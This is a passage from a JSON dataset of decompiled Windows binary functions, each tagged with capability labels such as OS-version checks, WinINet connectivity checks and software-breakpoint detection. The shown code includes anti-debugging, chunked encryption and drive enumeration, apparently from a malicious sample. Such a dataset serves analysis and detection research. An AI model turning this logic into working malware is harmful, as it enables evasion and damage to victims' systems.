0xe6546b64;\n    }\n    arg_10h = arg_10h - uVar2;\n    while (arg_10h != 0) {\n        uVar2 = uVar3 >> 8;\n        arg_10h = arg_10h + -1;\n        uVar3 = uVar2 | *in_EDX << 0x18;\n        in_EDX = in_EDX + 1;\n        uVar5 = uVar5 + 1;\n        if (uVar5 == 4) {\n            uVar3 = (uVar2 * 0x16a88000 | uVar3 * -0x3361d2af >> 0x11) * 0x1b873593;\n            uVar4 = ((uVar4 ^ uVar3) << 0xd | (uVar4 ^ uVar3) >> 0x13) * 5 + 0xe6546b64;\n            uVar5 = 0;\n        }\n    }\n    *arg_8h = uVar4;\n    *arg_ch = uVar3 & 0xffffff00 | uVar5;\n    return;\n}\n",
        "token_count": 779
    },
    "0040ffa1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0040ffa1(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0040392d(0, 0);\n    if (param_2 == '\\0') {\n        fcn.0040392d();\n    }\n    else {\n        iVar2 = fcn.00406c7f();\n        if (iVar2 == 0) {\n            in_EAX = 0;\n            iVar1 = 0;\n        }\n        else {\n            fcn.0040392d(iVar2, iVar1);\n            fcn.0040ff87(iVar2);\n            fcn.00406d6b();\n        }\n    }\n    return iVar1 + in_EAX;\n}\n",
        "token_count": 181
    },
    "00410004": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.00410004(void)\n\n{\n    if (*0x4338ec == 0) {\n        (**0x4137dc)(0x4338ec, 0, 0, 1, 0xf0000000);\n    }\n    return *0x4338ec != 0;\n}\n",
        "token_count": 69
    },
    "00410067": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00410067(uint arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t n;\n    int32_t var_10h;\n    int32_t s2;\n    int32_t s1;\n    uint var_1h;\n    \n    uVar10 = *arg_10h;\n    uVar2 = fcn.0041002f(arg_8h);\n    uVar8 = uVar2 - 0xb;\n    uVar9 = uVar10 % uVar8;\n    var_18h = uVar10 / uVar8 + (uVar9 != 0);\n    uVar10 = var_18h * uVar2;\n    var_10h = fcn.00406c7f();\n    if (var_10h != 0) {\n        s1 = fcn.00406c7f();\n        if (s1 != 0) {\n            n = 0;\n            s2 = arg_ch;\n            uVar3 = var_18h - 1;\n            var_1h._0_1_ = '\\x01';\n            iVar11 = var_10h;\n            if (var_18h != 1) {\n                do {\n                    var_18h = uVar8;\n                    sub.ntdll.dll_memcpy(s1, s2, uVar8);\n                    iVar4 = (**0x4137d4)(arg_8h, 0, 0, 0, s1, &var_18h, uVar2);\n                    if (iVar4 == 0) goto code_r0x0041018c;\n                    uVar7 = 0;\n                    if (uVar2 != 0) {\n                        puVar5 = (uVar2 - 1) + s1;\n                        do {\n                            uVar1 = *puVar5;\n                            puVar5 = puVar5 + -1;\n                            *(uVar7 + iVar11) = uVar1;\n                            uVar7 = uVar7 + 1;\n                        } while (uVar7 < uVar2);\n                    }\n                    iVar11 = iVar11 + var_18h;\n                    s2 = s2 + uVar8;\n                    n = n + 1;\n                } while (n < uVar3);\n            }\n            n = uVar9;\n            if (uVar9 == 0) {\n                n = uVar8;\n            }\n            sub.ntdll.dll_memcpy(s1, s2, n);\n            iVar4 = s1;\n            iVar6 = (**0x4137d4)(arg_8h, 0, 1, 0, s1, &n, uVar2);\n            if (iVar6 == 0) {\n                var_1h._0_1_ = '\\0';\n            }\n            uVar8 = 0;\n            if (uVar2 != 0) {\n                puVar5 = (uVar2 - 1) + iVar4;\n                do {\n                    uVar1 = *puVar5;\n                    puVar5 = puVar5 + -1;\n                    *(uVar8 + iVar11) = uVar1;\n                    uVar8 = uVar8 + 1;\n                } while (uVar8 < uVar2);\n            }\n            if (var_1h == '\\0') {\ncode_r0x0041018c:\n                fcn.00406d25();\n                fcn.00406d25();\n                var_10h = 0;\n            }\n            else {\n                *arg_10h = uVar10;\n            }\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 931
    },
    "00402746": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool fcn.00402746(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_58h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uVar1 = (*str.55_._0_4_)(10, &var_4h);\n    iVar2 = (**0x413834)(uVar1);\n    if (iVar2 != 0) {\n        if (5 < *0x434594) {\n            iVar2 = (**0x413830)(var_4h, 0x12, &var_14h, 4, &var_ch);\n            if (iVar2 == 0) goto code_r0x004027fc;\n            if (var_14h == 3) {\n                iVar2 = (**0x413830)(var_4h, 0x13, &var_8h, 4, &var_ch);\n                if (iVar2 == 0) goto code_r0x004027fc;\n            }\n        }\n        if (var_8h == 0) {\n            iVar2 = (**0x41382c)(var_4h, 1, &var_8h);\n            if (iVar2 == 0) goto code_r0x004027fc;\n        }\n        var_ch = 0x44;\n        iVar2 = (**0x4137d0)(0x1a, 0, &var_58h, &var_ch);\n        if (iVar2 != 0) {\n            (**0x413828)(var_8h, &var_58h, &var_10h);\n        }\n    }\ncode_r0x004027fc:\n    (**0x4134e8)(var_4h);\n    (**0x4134e8)(var_8h);\n    return var_10h != 0;\n}\n",
        "token_count": 464
    },
    "00402da4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.00402da4(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    cVar2 = fcn.00402a76();\n    if (cVar2 != '\\0') {\n        iVar1 = *(in_EAX + 0x14);\n        if (iVar1 == 0) {\n            var_4h = 0;\n            if (*(in_EAX + 0x20) == '\\0') {\n                var_8h = 0;\n            }\n            else {\n                var_8h = 1;\n            }\n        }\n        else if (iVar1 == 2) {\n            var_8h = *(in_EAX + 0x20);\n            var_4h = *(in_EAX + 0x24);\n        }\n        else if (iVar1 == 3) {\n            (**0x413184)(*(in_EAX + 0x20), 0, &var_8h);\n        }\n    }\n    return CONCAT44(var_4h, var_8h);\n}\n",
        "token_count": 268
    },
    "00402e0b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.00402e0b(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t unaff_EDI;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_4h;\n    \n    var_4h = 0;\n    cVar2 = fcn.00402a76();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    if (*(unaff_EDI + 0x14) != 3) {\n        fcn.00406d25();\n        *(unaff_EDI + 0x28) = 0;\n    }\n    iVar1 = *(unaff_EDI + 0x14);\n    if (iVar1 == 0) {\n        if (*(unaff_EDI + 0x20) == '\\0') {\n            uVar5 = 0xbf28c133;\n            uVar4 = 5;\n            uVar3 = 0x411f78;\n        }\n        else {\n            uVar5 = 0x656dc27d;\n            uVar4 = 4;\n            uVar3 = 0x411f70;\n        }\n    }\n    else {\n        if (iVar1 == 2) {\n            uVar3 = *(unaff_EDI + 0x20);\n            uVar4 = fcn.00407c1d(0x411f80, 5, 0x35e59f22, uVar3, *(unaff_EDI + 0x24));\n            fcn.00407e4e(uVar4, uVar3);\n            goto code_r0x00402e6c;\n        }\n        if (iVar1 != 1) {\n            if (iVar1 != 3) {\n                return 0;\n            }\n            return *(unaff_EDI + 0x20);\n        }\n        uVar5 = 0xc5a3ff84;\n        uVar4 = 4;\n        uVar3 = 0x411f88;\n    }\n    fcn.00407c1d(uVar3, uVar4, uVar5);\n    var_4h = fcn.00407c87();\ncode_r0x00402e6c:\n    *(unaff_EDI + 0x28) = var_4h;\n    return var_4h;\n}\n",
        "token_count": 519
    },
    "00403a06": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00403a06(uint *param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = param_1[1];\n    if (uVar2 < 2) {\n        uVar2 = 1;\n    }\n    fcn.004038a3(uVar2 + 1);\n    iVar1 = fcn.00404597(*param_1);\n    if (iVar1 == 0) {\n        in_EAX[1] = uVar2;\n    }\n    else {\n        *(*in_EAX + uVar2 * 4) = iVar1;\n        in_EAX[1] = uVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00403aad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403aad(uint *arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *unaff_ESI;\n    uint32_t arg_8h_00;\n    uint var_4h;\n    \n    uVar1 = arg_ch[1];\n    if (uVar1 == 1) {\n        uVar2 = fcn.00403a4c(arg_8h, **arg_ch);\n    }\n    else {\n        arg_8h_00 = arg_8h[1];\n        if (arg_8h[1] <= uVar1) {\n            arg_8h_00 = uVar1;\n        }\n        fcn.004038a3(arg_8h_00);\n        fcn.004038a3(arg_8h_00);\n        fcn.004038a3(arg_8h_00 * 2);\n        fcn.00403e49(*arg_8h, arg_8h_00);\n        uVar2 = fcn.0040435e(*unaff_ESI);\n        unaff_ESI[1] = uVar2;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 274
    },
    "00403bd8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00403bd8(void)\n\n{\n    fcn.00406c7f();\n    return;\n}\n",
        "token_count": 26
    },
    "004043d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004043d4(uint param_1, uint *param_2)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (1 < in_EAX) {\n        puVar2 = param_2 + 1;\n        for (iVar1 = in_EAX - 1; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n    }\n    *param_2 = 1;\n    return;\n}\n",
        "token_count": 135
    },
    "00404597": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404597(uint32_t param_1, uint32_t *param_2, int32_t *param_3)\n\n{\n    uint32_t in_EAX;\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    bVar4 = *param_3 + param_1 < param_1;\n    *param_2 = *param_3 + param_1;\n    if (1 < in_EAX) {\n        puVar1 = param_2 + 1;\n        iVar3 = in_EAX - 1;\n        do {\n            uVar2 = *((param_3 - param_2) + puVar1) + bVar4;\n            bVar4 = uVar2 < bVar4;\n            *puVar1 = uVar2;\n            puVar1 = puVar1 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "004045cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004045cc(int32_t *param_1, uint32_t *param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    bVar4 = 0xfffffffe < *param_1 - 1U;\n    *param_2 = *param_1 - 1U;\n    if (1 < in_EAX) {\n        puVar1 = param_2 + 1;\n        iVar3 = in_EAX - 1;\n        do {\n            uVar2 = *((param_1 - param_2) + puVar1) - bVar4;\n            bVar4 = -bVar4 - 1 < uVar2;\n            *puVar1 = uVar2;\n            puVar1 = puVar1 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "00404ac5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404ac5(uint32_t param_1)\n\n{\n    uchar uVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_4h;\n    \n    if (in_EAX < 3) {\n        return 2;\n    }\n    var_4h = param_1;\n    do {\n        uVar3 = 0;\n        do {\n            uVar1 = fcn.004095c4();\n            *(&var_4h + uVar3) = uVar1;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 4);\n        uVar3 = 0x80000000;\n        iVar2 = 0x20;\n        do {\n            if ((in_EAX - 2 & uVar3) != 0) break;\n            iVar2 = iVar2 + -1;\n            uVar3 = uVar3 >> 1;\n        } while (0 < iVar2);\n        if (iVar2 < 0x20) {\n            uVar3 = uVar3 * 2 - 1;\n        }\n        else {\n            uVar3 = 0xffffffff;\n        }\n        var_4h = var_4h & uVar3;\n        if (var_4h <= in_EAX - 2) {\n            return var_4h + 2;\n        }\n    } while( true );\n}\n",
        "token_count": 323
    },
    "00404b26": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b26(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    arg_8h_00 = fcn.00403bd8();\n    arg_8h_01 = fcn.00403bd8();\n    arg_ch_00 = fcn.00403bd8();\n    iVar1 = fcn.0040435e(arg_10h);\n    if (iVar1 == 0) {\n        fcn.004043d4();\n    }\n    else {\n        var_4h = 0x80000000;\n        do {\n            if ((var_4h & *(arg_10h + -4 + iVar1 * 4)) != 0) break;\n            var_4h = var_4h >> 1;\n        } while (var_4h != 0);\n        if (var_4h == 1) {\n            var_4h = 0x80000000;\n            iVar1 = iVar1 + -1;\n        }\n        else {\n            var_4h = var_4h >> 1;\n        }\n        fcn.004043a4();\n        if (iVar1 != 0) {\n            var_14h = arg_10h + -4 + iVar1 * 4;\n            do {\n                fcn.004041a4(arg_8h_00, arg_ch_00, unaff_ESI);\n                fcn.00403f7c(arg_8h_01, arg_8h_00, unaff_ESI * 2, arg_14h, unaff_ESI);\n                if ((*var_14h & var_4h) != 0) {\n                    fcn.00403e49(arg_ch, unaff_ESI);\n                    fcn.00403f7c(arg_8h_01, arg_8h_00, unaff_ESI * 2, arg_14h, unaff_ESI);\n                }\n                if (var_4h == 1) {\n                    iVar1 = iVar1 + -1;\n                    var_14h = var_14h + -1;\n                    var_4h = 0x80000000;\n                }\n                else {\n                    var_4h = var_4h >> 1;\n                }\n            } while (iVar1 != 0);\n        }\n        fcn.004043a4();\n    }\n    if (arg_8h_00 != 0) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    if (arg_8h_01 != 0) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    if (arg_ch_00 != 0) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    return 0;\n}\n",
        "token_count": 716
    },
    "00405acb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405acb(int32_t param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    \n    if ((*0x4340ac == 1) && (iVar2 = 0,  0 < param_2)) {\n        do {\n            puVar1 = param_1 + iVar2 * 8;\n            uVar3 = fcn.00405a5a(*puVar1, puVar1[1]);\n            iVar2 = iVar2 + 1;\n            *puVar1 = uVar3;\n            puVar1[1] = uVar3 >> 0x20;\n        } while (iVar2 < param_2);\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "004081e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004081e8(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t *in_EAX;\n    char extraout_CL;\n    char cVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    int64_t iVar8;\n    uint var_124h;\n    int32_t var_20h;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_5h;\n    \n    if ((in_EAX[1] & 1U) != 0) {\n        in_EAX[1] = in_EAX[1] & 0xfffffffb;\n    }\n    iVar2 = *in_EAX;\n    if (iVar2 < 1) {\n        return 0;\n    }\n    if (iVar2 < 3) {\n        in_EAX[3] = 1;\n        return 1;\n    }\n    if (iVar2 == 3) {\n        if (arg_ch == 0) {\n            return 0;\n        }\n        for (uVar7 = 0; ((in_EAX[3] == 0 || (uVar7 < in_EAX[3])) && (*(arg_ch + uVar7) != '\\0')); uVar7 = uVar7 + 1) {\n        }\ncode_r0x00408371:\n        in_EAX[3] = uVar7;\n        return uVar7;\n    }\n    if (iVar2 == 4) {\n        if (arg_ch == 0) {\n            return 0;\n        }\n        for (uVar7 = 0; ((in_EAX[3] == 0 || (uVar7 < in_EAX[3])) && (*(arg_ch + uVar7 * 2) != 0)); uVar7 = uVar7 + 1) {\n        }\n        goto code_r0x00408371;\n    }\n    if (3 < iVar2 - 5U) {\n        return 0;\n    }\n    var_5h._0_1_ = ~*(in_EAX + 1) & 0x20 | 7;\n    var_10h = 10;\n    if (iVar2 == 7) {\n        var_10h = 0x10;\n    }\n    else if (iVar2 == 8) {\n        var_10h = 8;\n    }\n    var_ch = &var_124h;\n    pcVar6 = arg_8h;\n    if (iVar2 != 5) goto code_r0x004082c2;\n    if (arg_10h < 1) {\n        if (arg_10h < 0) {\n            *arg_8h = '-';\n            goto code_r0x004082b1;\n        }\n        if (-1 < arg_10h) {\n            if ((0 < arg_10h) || (arg_ch != 0)) goto code_r0x00408296;\n            goto code_r0x004082b2;\n        }\n    }\n    else {\ncode_r0x00408296:\n        if ((in_EAX[1] & 0x200U) == 0) {\n            if ((in_EAX[1] & 0x400U) != 0) {\n                *arg_8h = ' ';\n                goto code_r0x004082b1;\n            }\n        }\n        else {\n            *arg_8h = '+';\ncode_r0x004082b1:\n            pcVar6 = arg_8h + 1;\n        }\ncode_r0x004082b2:\n        if ((0 < arg_10h) || (-1 < arg_10h)) goto code_r0x004082c2;\n    }\n    arg_ch = -arg_ch;\ncode_r0x004082c2:\n    var_14h = in_EAX[1];\n    var_18h = 0;\n    do {\n        iVar8 = sub.ntdll.dll__aulldvrm();\n        cVar5 = extraout_CL + '0';\n        if ('9' < cVar5) {\n            cVar5 = cVar5 + var_5h;\n        }\n        var_20h = arg_ch;\n        puVar4 = var_ch + 1;\n        *var_ch = cVar5;\n        var_ch = puVar4;\n        arg_ch = iVar8;\n    } while (iVar8 != 0);\n    while (&var_124h < var_ch) {\n        var_ch = var_ch + -1;\n        *pcVar6 = *var_ch;\n        pcVar6 = pcVar6 + 1;\n    }\n    *pcVar6 = '\\0';\n    uVar7 = pcVar6 - arg_8h;\n    puVar1 = in_EAX + 3;\n    if (*puVar1 < uVar7) {\n        *puVar1 = uVar7;\n    }\n    if ((var_14h & 4) == 0) {\n        return uVar7;\n    }\n    uVar3 = in_EAX[2];\n    if (uVar3 < *puVar1 || uVar3 == *puVar1) {\n        return uVar7;\n    }\n    *puVar1 = uVar3;\n    return uVar7;\n}\n",
        "token_count": 1210
    },
    "0040c189": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0040c189(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    uVar1 = (**0x4133b8)(0x412560, \"IsMenu\");\n    iVar2 = (**0x4134cc)(uVar1);\n    uVar3 = 0;\n    while ((uVar4 = uVar3,  *(uVar3 + iVar2) != 0x2b2 || (uVar4 = uVar3 + 2,  *(uVar4 + iVar2) != -0x18))) {\n        uVar3 = uVar4 + 1;\n        if (0x2f < uVar3) {\ncode_r0x0040c1d5:\n            if (*0x434740 == 0) {\n                *0x434738 = 1;\n                uVar3 = 0;\n                iVar5 = *0x434740;\n                do {\n                    if (*(uVar3 + iVar2) == 0x26a) {\n                        uVar4 = uVar3 + 6;\n                        for (uVar3 = uVar3 + 2; uVar3 < uVar4; uVar3 = uVar3 + 1) {\n                            if (*(uVar3 + iVar2) == -0x18) {\n                                *0x43473c = uVar4 - uVar3 < 3;\n                                iVar5 = *(uVar3 + 1 + iVar2) + uVar3 + 5 + iVar2;\n                                *0x434740 = iVar5;\n                                break;\n                            }\n                        }\n                        if (iVar5 != 0) {\n                            *0x434738 = 1;\n                            return;\n                        }\n                    }\n                    uVar3 = uVar3 + 1;\n                } while (uVar3 < 0x30);\n            }\n            return;\n        }\n    }\n    *0x434740 = *(uVar3 + 3 + iVar2) + uVar4 + 5 + iVar2;\n    goto code_r0x0040c1d5;\n}\n",
        "token_count": 476
    },
    "0040ef07": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.0040ef07(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_10h = (**0x413418)();\n    uVar4 = 0;\n    var_18h = 0x80000002;\n    var_14h = 0x80000001;\n    uVar3 = 0;\n    do {\n        uVar1 = fcn.00407c34(str.I.L, 0x3b, 0x6ecff9b9, 0, 0x20019, &var_8h);\n        iVar2 = (**0x4137fc)((&var_18h)[uVar3], uVar1);\n        if (iVar2 == 0) {\n            var_4h = 0;\n            var_ch = 4;\n            uVar1 = fcn.00407c34(0x4126dc, 8, 0xb9bd5125, 0, 0, &var_4h, &var_ch);\n            iVar2 = (**0x413800)(var_8h, uVar1);\n            if ((iVar2 == 0) && (var_4h != 0)) {\n                uVar4 = uVar4 | var_4h;\n            }\n            (**0x413804)(var_8h);\n        }\n        uVar3 = uVar3 + 1;\n    } while (uVar3 < 2);\n    return ~uVar4 & var_10h;\n}\n",
        "token_count": 394
    },
    "0040efb3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040efb3(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_410h;\n    \n    uVar1 = (**0x413370)(arg_8h);\n    if ((1 < uVar1) && ((uVar1 < 4 || (uVar1 == 6)))) {\n        iVar2 = (**0x413434)(arg_8h, &var_410h, 0x208);\n        if (iVar2 != 0) {\n            uVar3 = fcn.00407c34(0x4126e8, 4, 0xe0c7f35b, 4);\n            iVar2 = (**0x413158)(&var_410h, uVar3);\n            if (iVar2 == 0) {\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 216
    },
    "0040f73e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.0040f73e(uint arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_24ch;\n    uint var_44h;\n    uint var_2ch;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    cVar1 = fcn.00402699(arg_8h);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.00407c34(0x4126f8, 0x13, 0x18eef338);\n        fcn.00402664(arg_8h, uVar2);\n        var_20h = (**0x4134a0)();\n    }\n    (**0x4133e4)(&var_44h);\n    var_18h = 0;\n    var_10h = 0;\n    var_8h = 0;\n    var_1ch = NULL;\n    var_14h = 0;\n    var_ch = fcn.00409410();\n    (**0x4133f8)(&var_24ch, 0x104);\n    var_24h = fcn.0040ef07();\n    iVar4 = 0;\n    do {\n        uVar3 = fcn.0040f6f1(var_24h, &var_2ch);\n        if ((1 < uVar3) && ((uVar3 < 4 || (uVar3 == 6)))) {\n            fcn.0040f671(var_ch, &var_14h, &var_44h, &var_10h, &var_8h, &var_1ch, &var_18h, var_24ch == var_2ch);\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x1a);\n    fcn.004094f1();\n    fcn.0040952e();\n    iVar4 = (**0x4134a0)();\n    cVar1 = fcn.00402699(arg_8h);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.00407c34(0x41270c, 0x1f, 0x7fc2d6dc, iVar4 - var_20h);\n        fcn.00402664(arg_8h, uVar2);\n    }\n    if (var_14h != 0) {\n        if (var_8h == 0) {\n            var_8h = var_10h;\n        }\n        else {\n            *var_1ch = var_10h;\n        }\n        *arg_ch = var_8h;\n        *arg_10h = var_18h;\n        for (iVar4 = var_18h; iVar4 != 0; iVar4 = *(iVar4 + 0xc)) {\n            fcn.004028d0(arg_8h);\n        }\n    }\n    (**0x4133ec)(&var_44h);\n    return var_14h != 0;\n}\n",
        "token_count": 766
    },
    "0040fa7f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
